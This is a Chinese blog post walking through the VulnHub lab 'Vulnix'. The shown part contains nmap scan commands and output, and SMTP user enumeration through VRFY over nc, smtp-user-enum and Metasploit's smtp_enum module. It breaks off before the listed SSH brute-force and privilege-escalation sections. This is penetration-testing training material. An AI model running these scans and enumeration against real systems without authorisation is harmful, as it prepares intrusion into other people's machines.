<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="该文章暂无概述">
<meta property="og:type" content="article">
<meta property="og:title" content="VulnHub - HackLAB: Vulnix">
<meta property="og:url" content="https://z9m8r8.github.io/2024/12/19/HackLAB%20Vulnix/index.html">
<meta property="og:site_name" content="z9m8r8&#39;s Blog">
<meta property="og:description" content="该文章暂无概述">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-12-18T16:00:00.000Z">
<meta property="article:modified_time" content="2024-12-20T01:49:57.507Z">
<meta property="article:author" content="z9m8r8">
<meta property="article:tag" content="Vulnhub">
<meta property="article:tag" content="信息收集">
<meta property="article:tag" content="SMB">
<meta property="article:tag" content="Dirty COW">
<meta property="article:tag" content="SUID 提权">
<meta property="article:tag" content="NFS">
<meta property="article:tag" content="SMTP">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://z9m8r8.github.io/2024/12/19/HackLAB%20Vulnix/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/12/19/HackLAB%20Vulnix/","path":"2024/12/19/HackLAB Vulnix/","title":"VulnHub - HackLAB: Vulnix"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>VulnHub - HackLAB: Vulnix | z9m8r8's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">z9m8r8's Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1. 主机探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">2. 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smtp-%E6%9C%8D%E5%8A%A1"><span class="nav-text">3. SMTP 服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nfs-%E6%9C%8D%E5%8A%A1"><span class="nav-text">4. NFS 服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh-%E7%88%86%E7%A0%B4"><span class="nav-text">5. SSH 爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">6. 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dirtycow-%E6%8F%90%E6%9D%83"><span class="nav-text">6.1. DirtyCOW 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nfs-%E6%8F%90%E6%9D%83%E8%87%B3-vulnix-%E7%94%A8%E6%88%B7"><span class="nav-text">6.2. NFS 提权至 vulnix 用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nfs-%E6%8F%90%E6%9D%83%E8%87%B3-root-%E7%94%A8%E6%88%B7"><span class="nav-text">6.3. NFS 提权至 root 用户</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="z9m8r8"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">z9m8r8</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">185</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">177</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/12/19/HackLAB%20Vulnix/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="z9m8r8">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="z9m8r8's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="VulnHub - HackLAB: Vulnix | z9m8r8's Blog">
      <meta itemprop="description" content="该文章暂无概述">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          VulnHub - HackLAB: Vulnix
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-12-19 00:00:00" itemprop="dateCreated datePublished" datetime="2024-12-19T00:00:00+08:00">2024-12-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-12-20 09:49:57" itemprop="dateModified" datetime="2024-12-20T09:49:57+08:00">2024-12-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>5.8k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>21 分钟</span>
    </span>
</div>

            <div class="post-description">该文章暂无概述</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><blockquote>
<p>靶机：<a
target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacklab-vulnix,48/">HackLAB: Vulnix
~ VulnHub</a></p>
</blockquote>
<h2 id="主机探测">1. 主机探测</h2>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p>靶机：192.168.159.5</p>
<h2 id="端口扫描">2. 端口扫描</h2>
<ul>
<li>TCP 端口</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -p- 192.168.159.5 </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 04:30 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.5</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 65518 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">25/tcp    open  smtp</span><br><span class="line">79/tcp    open  finger</span><br><span class="line">110/tcp   open  pop3</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">143/tcp   open  imap</span><br><span class="line">512/tcp   open  <span class="built_in">exec</span></span><br><span class="line">513/tcp   open  login</span><br><span class="line">514/tcp   open  shell</span><br><span class="line">993/tcp   open  imaps</span><br><span class="line">995/tcp   open  pop3s</span><br><span class="line">2049/tcp  open  nfs</span><br><span class="line">40247/tcp open  unknown</span><br><span class="line">42484/tcp open  unknown</span><br><span class="line">44386/tcp open  unknown</span><br><span class="line">44410/tcp open  unknown</span><br><span class="line">46185/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:00:89:ED (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 31.96 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sSVC -p 22,25,79,110,111,143,512,513,514,993,995,2049,40247,42484,44386,44410,46185  192.168.159.5</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 04:34 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.5</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE    VERSION</span><br><span class="line">22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 10:<span class="built_in">cd</span>:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)</span><br><span class="line">|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)</span><br><span class="line">|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)</span><br><span class="line">25/tcp    open  smtp       Postfix smtpd</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-12-18T09:37:20+00:00; +3s from scanner time.</span><br><span class="line">|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN</span><br><span class="line">79/tcp    open  finger     Linux fingerd</span><br><span class="line">|_finger: No one logged on.\x0D</span><br><span class="line">110/tcp   open  pop3?</span><br><span class="line">| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2012-09-02T17:40:22</span><br><span class="line">|_Not valid after:  2022-09-02T17:40:22</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-12-18T09:37:20+00:00; +3s from scanner time.</span><br><span class="line">|_pop3-capabilities: SASL UIDL STLS PIPELINING RESP-CODES TOP CAPA</span><br><span class="line">111/tcp   open  rpcbind    2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  2,3,4       2049/tcp   nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp6  nfs</span><br><span class="line">|   100003  2,3,4       2049/udp   nfs</span><br><span class="line">|   100003  2,3,4       2049/udp6  nfs</span><br><span class="line">|   100005  1,2,3      43909/udp   mountd</span><br><span class="line">|   100005  1,2,3      44410/tcp   mountd</span><br><span class="line">|   100005  1,2,3      46902/udp6  mountd</span><br><span class="line">|   100005  1,2,3      48852/tcp6  mountd</span><br><span class="line">|   100021  1,3,4      33131/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      44386/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      52790/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      57197/udp   nlockmgr</span><br><span class="line">|   100024  1          35838/tcp6  status</span><br><span class="line">|   100024  1          40247/tcp   status</span><br><span class="line">|   100024  1          46060/udp6  status</span><br><span class="line">|   100024  1          49158/udp   status</span><br><span class="line">|   100227  2,3         2049/tcp   nfs_acl</span><br><span class="line">|   100227  2,3         2049/tcp6  nfs_acl</span><br><span class="line">|   100227  2,3         2049/udp   nfs_acl</span><br><span class="line">|_  100227  2,3         2049/udp6  nfs_acl</span><br><span class="line">143/tcp   open  imap       Dovecot imapd</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-12-18T09:37:20+00:00; +3s from scanner time.</span><br><span class="line">|_imap-capabilities: STARTTLS LITERAL+ have listed post-login more LOGIN-REFERRALS OK IMAP4rev1 ID Pre-login SASL-IR LOGINDISABLEDA0001 ENABLE IDLE capabilities</span><br><span class="line">| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2012-09-02T17:40:22</span><br><span class="line">|_Not valid after:  2022-09-02T17:40:22</span><br><span class="line">512/tcp   open  <span class="built_in">exec</span>       netkit-rsh rexecd</span><br><span class="line">513/tcp   open  login?</span><br><span class="line">514/tcp   open  tcpwrapped</span><br><span class="line">993/tcp   open  ssl/imap   Dovecot imapd</span><br><span class="line">|_imap-capabilities: LITERAL+ post-login listed have more LOGIN-REFERRALS OK IMAP4rev1 ID AUTH=PLAINA0001 SASL-IR Pre-login ENABLE IDLE capabilities</span><br><span class="line">| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2012-09-02T17:40:22</span><br><span class="line">|_Not valid after:  2022-09-02T17:40:22</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-12-18T09:37:20+00:00; +3s from scanner time.</span><br><span class="line">995/tcp   open  ssl/pop3s?</span><br><span class="line">| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2012-09-02T17:40:22</span><br><span class="line">|_Not valid after:  2022-09-02T17:40:22</span><br><span class="line">|_pop3-capabilities: SASL(PLAIN) UIDL USER PIPELINING RESP-CODES TOP CAPA</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-12-18T09:37:20+00:00; +3s from scanner time.</span><br><span class="line">2049/tcp  open  nfs        2-4 (RPC <span class="comment">#100003)</span></span><br><span class="line">40247/tcp open  status     1 (RPC <span class="comment">#100024)</span></span><br><span class="line">42484/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">44386/tcp open  nlockmgr   1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">44410/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">46185/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">MAC Address: 00:0C:29:00:89:ED (VMware)</span><br><span class="line">Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2s, deviation: 0s, median: 2s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 198.40 seconds</span><br></pre></td></tr></table></figure>
<ul>
<li>UDP 端口</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># nmap -sU --top-ports=&quot;1000&quot; 192.168.159.5  </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 05:05 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.5</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line">Not shown: 994 closed udp ports (port-unreach)</span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">68/udp    open|filtered dhcpc</span><br><span class="line">111/udp   open          rpcbind</span><br><span class="line">826/udp   open|filtered unknown</span><br><span class="line">2049/udp  open          nfs</span><br><span class="line">33281/udp open|filtered unknown</span><br><span class="line">49158/udp open          unknown</span><br><span class="line">MAC Address: 00:0C:29:00:89:ED (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1099.47 seconds</span><br></pre></td></tr></table></figure>
<h2 id="smtp-服务">3. SMTP 服务</h2>
<p>枚举用户 ~ [[SMTP 用户枚举]]</p>
<blockquote>
<p><a
target="_blank" rel="noopener" href="https://www.freebuf.com/news/182746.html">SMTP用户枚举原理简介及相关工具
- FreeBuf网络安全行业门户</a></p>
</blockquote>
<p>nc 连接测试VRFY，EXPN命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># nc -nv 192.168.159.5 25                         </span></span><br><span class="line">(UNKNOWN) [192.168.159.5] 25 (smtp) open</span><br><span class="line">VRFY user</span><br><span class="line">220 vulnix ESMTP Postfix (Ubuntu)</span><br><span class="line">252 2.0.0 user</span><br><span class="line">VRFY vulnix</span><br><span class="line">252 2.0.0 vulnix</span><br><span class="line">VRFY <span class="built_in">test</span></span><br><span class="line">550 5.1.1 &lt;<span class="built_in">test</span>&gt;: Recipient address rejected: User unknown <span class="keyword">in</span> <span class="built_in">local</span> recipient table</span><br></pre></td></tr></table></figure>
<p>存在 user 和 vulnix 用户，test 用户不存在，利用自动话工具测试</p>
<p>kali 自带的 smtp-user-enum 没扫出来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smtp-user-enum -M VRFY -u vulnix -t 192.168.159.5</span><br><span class="line">smtp-user-enum -M VRFY -U /usr/share/wordlists/wfuzz/general/common.txt -t 192.168.159.5 </span><br></pre></td></tr></table></figure>
<p>MSF 的扫描可以</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smtp/smtp_enum) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smtp/smtp_enum):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting                                                Required  Description</span><br><span class="line">   ----       ---------------                                                --------  -----------</span><br><span class="line">   RHOSTS     192.168.159.5                                                  <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT      25                                                             <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   THREADS    1                                                              <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line">   UNIXONLY   <span class="literal">true</span>                                                           <span class="built_in">yes</span>       Skip Microsoft bannered servers when testing unix <span class="built_in">users</span></span><br><span class="line">   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  <span class="built_in">yes</span>       The file that contains a list of probable <span class="built_in">users</span> accounts.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smtp/smtp_enum) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] 192.168.159.5:25      - 192.168.159.5:25 Banner: 220 vulnix ESMTP Postfix (Ubuntu)</span><br><span class="line">[+] 192.168.159.5:25      - 192.168.159.5:25 Users found: , backup, bin, daemon, games, gnats, irc, landscape, libuuid, list, lp, mail, man, messagebus, news, nobody, postfix, postmaster, proxy, sshd, <span class="built_in">sync</span>, sys, syslog, user, uucp, whoopsie, www-data</span><br><span class="line">[*] 192.168.159.5:25      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<p><strong>smtp-user-enum.py——ChatGPT</strong></p>
